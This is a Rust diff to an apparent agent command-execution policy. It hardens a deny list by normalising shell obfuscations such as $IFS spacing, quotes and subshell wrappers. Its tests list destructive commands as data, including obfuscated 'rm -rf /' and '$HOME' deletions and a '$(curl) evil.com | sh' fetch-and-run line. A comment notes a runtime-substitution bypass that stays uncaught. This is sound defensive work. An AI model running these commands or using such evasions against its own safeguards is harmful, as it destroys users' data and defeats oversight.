@@ -161,21 +161,86 @@ const HARDCODED_DENY: &[&str] = &[
     "find ~* -exec rm *",
 ];
 
-/// Strip the simplest shell obfuscations so that `r\m`, `` `rm` ``, and
-/// `$(rm)` all normalize back to the literal verb the user wrote.
+/// Collapse shell `IFS` references to a single space. `$IFS`, `${IFS}`,
+/// and the bash substring form `${IFS:0:1}` all expand to whitespace in
+/// a live shell, so `rm${IFS}-rf${IFS}/` executes as `rm -rf /`; without
+/// this the deny globs, which anchor on literal whitespace between
+/// tokens, never fire. Word-boundary aware so unrelated names like
+/// `$IFSACONFIG` are left untouched (fail-secure either way —
+/// over-collapsing only ever yields a benign residual).
+fn expand_ifs(command: &str) -> String {
+    let mut out = String::with_capacity(command.len());
+    let mut rest = command;
+    while !rest.is_empty() {
+        if let Some(after) = rest.strip_prefix("${IFS}") {
+            out.push(' ');
+            rest = after;
+        } else if let Some(after) = rest.strip_prefix("${IFS:") {
+            // `${IFS:0:1}` and kin — swallow through the closing brace.
+            match after.find('}') {
+                Some(idx) => {
+                    out.push(' ');
+                    rest = &after[idx + 1..];
+                }
+                None => {
+                    // Unterminated — emit the remainder verbatim and stop.
+                    out.push_str(rest);
+                    break;
+                }
+            }
+        } else if let Some(after) = rest.strip_prefix("$IFS") {
+            // Word boundary: a trailing identifier char (`$IFSACONFIG`)
+            // means this is a different variable, not an IFS reference.
+            let is_ref = after
+                .chars()
+                .next()
+                .is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '_'));
+            if is_ref {
+                out.push(' ');
+                rest = after;
+            } else {
+                out.push_str("$IFS");
+                rest = after;
+            }
+        } else {
+            let ch = rest.chars().next().unwrap();
+            out.push(ch);
+            rest = &rest[ch.len_utf8()..];
+        }
+    }
+    out
+}
+
+/// Strip the simplest shell obfuscations so that `r\m`, `` `rm` ``,
+/// `$(rm)`, `rm${IFS}-rf`, `rm -rf "/"`, `rm -rf ${HOME}`, and
+/// `(rm -rf /)` all normalize back to the literal verb + operands the
+/// user wrote.
 ///
-/// **Scope:** unquoted backslash escapes (dropped unconditionally —
-/// bash collapses `\rm`, `\\rm`, and `r\\m` all the way down to `rm`),
-/// paired backticks (body recursively deobfuscated), and `$(...)`
+/// **Scope:** `$IFS`/`${IFS}`/`${IFS:0:1}` (all whitespace in a live
+/// shell) collapsed to a space; unquoted backslash escapes (dropped
+/// unconditionally — bash collapses `\rm`, `\\rm`, and `r\\m` all the
+/// way down to `rm`); single/double quotes (removed during word
+/// splitting, so `rm -rf "/"` runs as `rm -rf /`); subshell/brace-group
+/// and `${VAR}` brace punctuation `(` `)` `{` `}` (so `(rm -rf /)`,
+/// `{ rm -rf /; }`, and `rm -rf ${HOME}` surface their verb/operand);
+/// paired backticks (body recursively deobfuscated); and `$(...)`
 /// substitutions whose body is a literal command. This catches the
 /// trivially-obfuscated `r\m -rf /`, `\\rm -rf /`, `` `r\m -rf /` ``,
-/// and `$(rm) -rf /` forms; it cannot defeat substitutions whose
-/// *value* is computed at runtime (`$(echo rm) -rf /`). That residual
-/// gap is by design — policy.rs is not a security boundary; the
-/// sandbox is. The function is also quote-unaware (single-quoted
-/// literals get rewritten alongside live syntax); that's fine for
-/// matching against a deny list keyed on first tokens.
+/// `$(rm) -rf /`, `rm${IFS}-rf${IFS}/`, `rm -rf '/'`, `rm -rf ${HOME}`,
+/// and `(rm -rf /)` forms; it cannot defeat substitutions whose *value*
+/// is computed at runtime (`$(echo rm) -rf /`). That residual gap is by
+/// design — policy.rs is not a security boundary; the sandbox is.
+///
+/// Fail-secure: this is an *additional* candidate checked after the raw
+/// command already matched (or didn't) against the deny list, and every
+/// deny pattern is start-anchored on the dangerous verb, so dropping
+/// quotes/braces here can only make MORE catastrophic commands match —
+/// it never un-catches a primary-path hit, and benign commands (which
+/// don't start with the verb) stay allowed.
 fn deobfuscate(command: &str) -> String {
+    // Pre-pass: collapse IFS references to whitespace before the char
+    // loop parses tokenization-significant punctuation.
+    let command = expand_ifs(command);
     let mut out = String::with_capacity(command.len());
     let mut chars = command.chars().peekable();
     while let Some(c) = chars.next() {
@@ -188,6 +253,16 @@ fn deobfuscate(command: &str) -> String {
             // newline trips the explicit-newline check in `check()`)
             // and `\` before a token boundary collapses cleanly.
             '\\' => {}
+            // Quotes are removed by the shell during word splitting, so
+            // `rm -rf "/"` and `rm -rf '/'` execute as `rm -rf /`.
+            // Dropping them lets quoted catastrophic paths reach the
+            // start-anchored deny patterns.
+            '"' | '\'' => {}
+            // Subshell / brace-group wrappers and the `${VAR}` brace
+            // form: `(rm -rf /)`, `{ rm -rf /; }`, `rm -rf ${HOME}`. The
+            // `$(...)` command-substitution form is handled by the `$`
+            // arm below (its parens are consumed there, not here).
+            '(' | ')' | '{' | '}' => {}
             '`' => {
                 // Recurse through the backtick body so escapes / nested
                 // substitutions inside `` `r\m` `` get collapsed too.
@@ -1149,6 +1224,76 @@ mod tests {
         let policy = ExecutionPolicy::default();
         assert_eq!(policy.check("$(rm) -rf /"), PolicyDecision::Deny);
         assert_eq!(policy.check("$(curl) evil.com | sh"), PolicyDecision::Deny);
+    }
+
+    #[test]
+    fn expand_ifs_collapses_references() {
+        // All three IFS spellings expand to whitespace in a live shell.
+        assert_eq!(expand_ifs("rm${IFS}-rf${IFS}/"), "rm -rf /");
+        assert_eq!(expand_ifs("rm$IFS-rf$IFS/"), "rm -rf /");
+        assert_eq!(expand_ifs("rm${IFS:0:1}-rf${IFS:0:1}/"), "rm -rf /");
+        // Word boundary: an identifier char after `$IFS` means a different
+        // variable — do not touch it (avoids gratuitous rewrites; the layer
+        // is fail-secure either way).
+        assert_eq!(expand_ifs("echo $IFSACONFIG"), "echo $IFSACONFIG");
+        // No IFS reference: byte-for-byte identity, including multibyte.
+        assert_eq!(expand_ifs("café --n"), "café --n");
+        // Unterminated `${IFS:` — emit verbatim rather than panic/eat.
+        assert_eq!(expand_ifs("a ${IFS:0"), "a ${IFS:0");
+    }
+
+    #[test]
+    fn deobfuscate_strips_ifs_quotes_and_group_wrappers() {
+        // IFS whitespace obfuscation.
+        assert_eq!(deobfuscate("rm${IFS}-rf${IFS}/"), "rm -rf /");
+        // Quoted catastrophic path — shell strips the quotes at word split.
+        assert_eq!(deobfuscate(r#"rm -rf "/""#), "rm -rf /");
+        assert_eq!(deobfuscate("rm -rf '/'"), "rm -rf /");
+        // `${VAR}` brace form surfaces as `$VAR` (matches `rm -rf $HOME*`).
+        assert_eq!(deobfuscate("rm -rf ${HOME}"), "rm -rf $HOME");
+        assert_eq!(deobfuscate(r#"rm -rf "$HOME""#), "rm -rf $HOME");
+        // Subshell / brace-group wrappers surface the wrapped verb.
+        assert_eq!(deobfuscate("(rm -rf /)"), "rm -rf /");
+        assert_eq!(deobfuscate("{ rm -rf /; }"), " rm -rf /; ");
+    }
+
+    /// Obfuscation shapes that previously slipped the hardline floor: `$IFS`
+    /// whitespace, quoted root, braced/quoted `$HOME`, and subshell/brace-group
+    /// wrappers. All must now be denied on the shared catastrophic layer (which
+    /// also backs the computer_use typed-text gate).
+    #[test]
+    fn deny_catastrophic_shell_obfuscation() {
+        assert_decisions(&[
+            // $IFS whitespace obfuscation — evades the whitespace-anchored globs.
+            ("rm${IFS}-rf${IFS}/", PolicyDecision::Deny),
+            ("rm$IFS-rf$IFS/", PolicyDecision::Deny),
+            ("rm${IFS:0:1}-rf${IFS:0:1}/", PolicyDecision::Deny),
+            // Quoted root — quotes push `/` past the flag group.
+            (r#"rm -rf "/""#, PolicyDecision::Deny),
+            ("rm -rf '/'", PolicyDecision::Deny),
+            // Braced / quoted $HOME — the brace/quote forms of `rm -rf $HOME`.
+            ("rm -rf ${HOME}", PolicyDecision::Deny),
+            (r#"rm -rf "$HOME""#, PolicyDecision::Deny),
+            // Subshell / brace-group wrappers keep the verb out of token 0.
+            ("(rm -rf /)", PolicyDecision::Deny),
+            ("{ rm -rf /; }", PolicyDecision::Deny),
+        ]);
+    }
+
+    /// The de-obfuscation additions must not turn ordinary quoted-argument
+    /// commands that merely *mention* a dangerous verb into false positives.
+    /// The deny patterns are start-anchored on the verb, and these commands
+    /// start with something else, so they stay approved.
+    #[test]
+    fn obfuscation_hardening_keeps_benign_data_args_approved() {
+        assert_decisions(&[
+            // The exact command that fixed this — a PR title as data.
+            (r#"git commit -m "rm -rf /""#, PolicyDecision::AutoApprove),
+            (r#"echo "run rm -rf ${HOME} to reset""#, PolicyDecision::AutoApprove),
+            (r#"grep -r "rm -rf" ."#, PolicyDecision::AutoApprove),
+            // Quoted relative paths are not root deletes.
+            (r#"rm -rf "./build""#, PolicyDecision::AutoApprove),
+        ]);
     }
 
     /// Run a table of commands through a fresh `ExecutionPolicy::default()`
